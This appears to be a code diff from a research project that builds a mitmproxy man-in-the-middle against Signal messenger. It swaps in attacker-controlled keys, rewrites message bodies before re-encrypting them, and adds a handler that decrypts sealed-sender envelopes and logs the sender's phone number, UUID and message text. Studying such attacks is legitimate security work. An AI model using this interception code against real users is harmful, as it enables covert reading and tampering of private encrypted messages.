@@ -1,10 +1,12 @@
 import base64
 from copy import deepcopy
+
+import mitmproxy.websocket
 from mitmproxy.addonmanager import Loader
 from mitmproxy.http import HTTPFlow, Request, Response, Headers
 from mitmproxy.net.http.status_codes import RESPONSES
 from dataclasses import dataclass
-from typing import Optional
+from typing import Optional, Union
 import logging
 # FORMAT = "[%(filename)s:%(lineno)s-%(funcName)20s()] %(message)s"
 # logging.basicConfig(format=FORMAT)
@@ -16,14 +18,17 @@ from signal_protocol import state, helpers
 from signal_protocol.address import ProtocolAddress, DeviceId
 from signal_protocol.identity_key import IdentityKeyPair, IdentityKey
 from signal_protocol.curve import PublicKey, PrivateKey
+from signal_protocol.sealed_sender import sealed_sender_decrypt
 from signal_protocol import kem
 from base64 import b64decode, b64encode
 
 import utils
+from constants import TRUST_ROOT_STAGING_PK
 from database import User, Device, LegitBundle, MitMBundle
 from enum import Enum
 import parse
 
+from protos.gen.SignalService_pb2 import Envelope
 from protos.gen.WebSocketResources_pb2 import WebSocketMessage, WebSocketRequestMessage, WebSocketResponseMessage
 from server_proto import addons, HOST_HTTPBIN
 from mitm_interface import MitmUser
@@ -389,7 +394,7 @@ def _v2_keys(flow: HTTPFlow):
         last_kyber,
         pre_keys[0]["keyId"],
         pq_pre_keys[0]["keyId"]
-    ) ## spk is a string, wtf is the keyId?
+    )  ## spk is a string, wtf is the keyId?
 
     ## todo for later: Make sure all the keys we generate are stored in the database
 
@@ -819,7 +824,7 @@ def _v1_ws_message(flow, identifier):
             try:
                 if dec.typingMessage.timestamp == 0:
                     # not a timestamp message
-                    out_msg = f"bist du ein 🐿️? -- От судьбы не уйти.! [orig msg was: {dec.dataMessage.body}]\nPowered by SCION(https://www.youtube.com/watch?v=CzXJ0i4xABI)".encode()
+                    out_msg = f"bist du ein 🐿️? -- От судьбы не уйти.!\n[orig msg was: {dec.dataMessage.body}]\nPowered by SCION\n(https://www.youtube.com/watch?v=CzXJ0i4xABI)".encode()
                     to_enc = Content()
                     to_enc.CopyFrom(dec)
                     to_enc.dataMessage.body = out_msg
@@ -827,7 +832,8 @@ def _v1_ws_message(flow, identifier):
                     to_enc = Content()
                     to_enc.CopyFrom(dec)
 
-                enc : CiphertextMessage = fakeVictim.encrypt(ProtocolAddress(destination_user, 1), to_enc.SerializeToString())
+                enc: CiphertextMessage = fakeVictim.encrypt(ProtocolAddress(destination_user, 1),
+                                                            to_enc.SerializeToString())
                 # enc: CiphertextMessage = fakeUser.encrypt(ProtocolAddress(destination_user, 1),
                 #                                           to_enc.SerializeToString())
                 logging.info(f"Created CTXT: {enc}")
@@ -842,11 +848,7 @@ def _v1_ws_message(flow, identifier):
     return json.dumps(req)
 
 
-def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
-    ws_msg = WebSocketMessage()
-    ws_msg.ParseFromString(msg.content)
-    ws_msg = ws_msg.request if rtype == RouteType.REQUEST else ws_msg.response
-
+def decap_ws_msg(orig_flow: HTTPFlow, ws_msg, rtype=RouteType.REQUEST):
     f = HTTPFlow(client_conn=orig_flow.client_conn, server_conn=orig_flow.server_conn)
 
     if rtype == RouteType.REQUEST:
@@ -861,12 +863,64 @@ def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
                             path=ws_msg.path.encode(), headers=Headers(), content=ws_msg.body)
     else:
         # todo: handle headeers + reason
-        rp = Response(http_version=orig_flow.response.http_version.encode(), status_code=ws_msg.status, reason=b"id: ",
+        f.response = Response(http_version=orig_flow.response.http_version.encode(), status_code=ws_msg.status, reason=b"id: ",
                       headers=Headers(), content=ws_msg.body, trailers=None,
                       timestamp_start=orig_flow.response.timestamp_start,
                       timestamp_end=orig_flow.response.timestamp_end)
-        f.response = rp
     return f
+
+
+def v1_api_message(flow: HTTPFlow):
+    ########## MASSIVE HACK
+    session = conversation_session[
+        list(conversation_session.keys())[0]
+    ]
+    fakeVictim: MitmUser = session[0]
+    fakeUser: MitmUser = session[1]
+    #############
+
+    logging.warning(flow)
+    envelope = Envelope()
+    envelope.ParseFromString(flow.request.content)
+
+    if envelope.type == Envelope.RECEIPT:
+        return flow.request.content
+
+    ####### Another massive hack :/
+    device: Device = Device.get()
+    user: User = User.get()
+    ############
+
+    failed = False
+    try:
+        result = sealed_sender_decrypt(envelope.content, TRUST_ROOT_STAGING_PK, int(time.time()), str(user.pNumber),
+                                   str(device.aci), DeviceId(1), fakeVictim.store)
+        logging.warning("v SEALED SENDER DECRYPTION v")
+        logging.warning(result)
+        logging.warning(result.sender_e164())
+        logging.warning(result.sender_uuid())
+        logging.warning(result.device_id())
+        logging.warning(result.message())
+        logging.warning("^ SEALED SENDER DECRYPTION ^")
+    except Exception as e:
+        logging.warning(f"DECRYPTION FAILED: no sealed sender :c if used fakeVictim (correct) \n\t{e}")
+        failed = True
+
+    if failed:
+        try:
+            result = sealed_sender_decrypt(envelope.content, TRUST_ROOT_STAGING_PK, int(time.time()), str(user.pNumber),
+                                           str(device.aci), DeviceId(1), fakeUser.store)
+            logging.warning("v SEALED SENDER DECRYPTION v")
+            logging.warning(result)
+            logging.warning(result.sender_e164())
+            logging.warning(result.sender_uuid())
+            logging.warning(result.device_id())
+            logging.warning(result.message())
+            logging.warning("^ SEALED SENDER DECRYPTION ^")
+        except Exception as exp:
+            logging.warning(f"DECRYPTION FAILED: no sealed sender :c if used fakeUser (should be bad) \n\t{exp}")
+
+    return None
 
 
 ws_resp = Router()
@@ -877,18 +931,30 @@ ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}
                   None)
 ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile, None)
 ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)
+ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/api/v1/message"), HTTPVerb.ANY, v1_api_message, None)
 
 ws_req = Router()
 ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v1_ws_message, None)
 ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)
+ws_req.add_route(HOST_HTTPBIN, parse.Parser("/api/v1/message"), HTTPVerb.ANY, v1_api_message, None)
+
+
+def unwarp_websocket(ws: mitmproxy.websocket.WebSocketMessage) -> Union[
+    WebSocketRequestMessage | WebSocketResponseMessage | WebSocketMessage]:
+    msg = WebSocketMessage()
+    msg.ParseFromString(ws.content)
+    if msg.type == WebSocketMessage.UNKNOWN:
+        logging.debug(f"Couldn't figure out a more specific type, returning {msg}")
+        return msg
+    if msg.type == WebSocketMessage.REQUEST:
+        return msg.request
+    return msg.response
 
 
 @api.ws_route("/v1/websocket/", rtype=RouteType.REQUEST)
 def _v1_websocket_req(flow: HTTPFlow, msg):
-    ws_msg = WebSocketMessage()
-    ws_msg.ParseFromString(msg.content)
-    ws_msg = ws_msg.request
-    logging.debug(f"WEBSOCKET REQUEST: {ws_msg}")
+    ws_msg = unwarp_websocket(msg)
+    logging.debug(f"WEBSOCKET (c2s): {ws_msg}")
     msg.injected = True
 
     id = ws_msg.id
@@ -903,7 +969,7 @@ def _v1_websocket_req(flow: HTTPFlow, msg):
     if "signal" not in host:
         host = HOST_HTTPBIN  # this shouldn't be needed but just to be safe ^^
 
-    f = decap_ws_msg(flow, msg)
+    f = decap_ws_msg(flow, ws_msg)
     handler, params, _ = ws_req.find_handler(host, path)
     logging.debug(f"HANDLER (req): {handler}, PARAMS: {params} -- {host} / {path}")
 
@@ -924,17 +990,16 @@ def _v1_websocket_req(flow: HTTPFlow, msg):
 
 @api.ws_route("/v1/websocket/", rtype=RouteType.RESPONSE)
 def _v1_websocket_resp(flow: HTTPFlow, msg):
-    ws_msg = WebSocketMessage()
-    ws_msg.ParseFromString(msg.content)
-    ws_msg = ws_msg.response
-    logging.debug(f"WEBSOCKET RESPONSE: {ws_msg}")
+    ws_msg = unwarp_websocket(msg)
+    logging.debug(f"WEBSOCKET (s2c): {ws_msg}")
     msg.injected = True
 
     id = ws_msg.id
 
     if not websocket_open_state.get(id):
-        logging.debug(f"Message request does not exist for id {id}: {ws_msg.body}")
-        return
+        logging.debug(f"Message request does not exist for id {id}: {len(ws_msg.body)}")
+        # return
+        websocket_open_state[id].request = ws_msg
 
     path = websocket_open_state[id].request.path
 
@@ -945,7 +1010,11 @@ def _v1_websocket_resp(flow: HTTPFlow, msg):
     if "signal" not in host:
         host = HOST_HTTPBIN  # this shouldn't be needed but just to be safe ^^
 
-    f = decap_ws_msg(flow, msg, RouteType.RESPONSE)
+    ## TODO: this approach might be fundamentally road -- thinking of them as request/responses
+    ## since for example /api/v1/message is a REQUEST sent by the server
+    ## A refactor to DICTION instead of RouteTzpe might make more sense...
+    f = decap_ws_msg(flow, ws_msg, RouteType.RESPONSE) if "/api/v1/message" not in path \
+        else decap_ws_msg(flow, ws_msg, RouteType.REQUEST) ## TODO: trust the websocket message info instead of direction flow
     handler, params, _ = ws_resp.find_handler(host, path)
     logging.warning(f"HANDLER (resp): {handler}, PARAMS: {params} -- {host} / {path}")
 
